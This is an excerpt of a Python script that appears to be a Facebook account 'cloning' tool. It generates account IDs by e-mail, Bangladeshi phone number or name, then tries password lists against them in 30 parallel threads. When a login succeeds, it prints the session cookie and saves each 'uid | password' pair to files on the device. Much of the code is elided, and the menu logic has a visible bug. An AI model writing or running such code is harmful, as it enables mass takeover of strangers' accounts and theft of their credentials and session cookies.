...
class Main:
    def __init__(self):
        ...
        print("[1] Random E-mail Cloning ")
        print("[2] BD Number Cloning")
        print("[E] Exit")
        SAHARIYAN =input("[+] Choose : ")
        if SAHARIYAN in ["1", "01"]:
            v1()
        if SAHARIYAN in ["2","02"]:
            v2()
        if SAHARIYAN in ["2","02"]:
            v3()
        if SAHARIYAN in [" E", "0E"]:
            exit()
        else:
            exit()
def v1():
    ...
    with ThreadPool(max_workers=30) as yaari:
        ...
        print(f"\033[1;97m[+]  Enter Domain:\033[1;92m {doamin}")
...
def v3():
    ...
    with ThreadPool(max_workers=30) as yaari:
        ...
        tl = str(len(user))
        print('[+]  Total ids:\033[1;92m '+tl)
        print(f"\033[1;97m[+]  Enter Domain:\033[1;92m Facebook Name Cloning")
        print('\033[1;97m[+]  The process has been started')
        print('[+]  Wait for ids ')
        print(50*'_')
        for guru in user:
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r[\033[1;92mSAHARIYAN\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m] [\033[1;91mCP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                print(f" \n Cookie : {coki}")
                open('/sdcard/SAHARIYAN/ok.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
                ...
                open('/sdcard/SAHARIYAN-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[SAHARIYAN1] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
Main()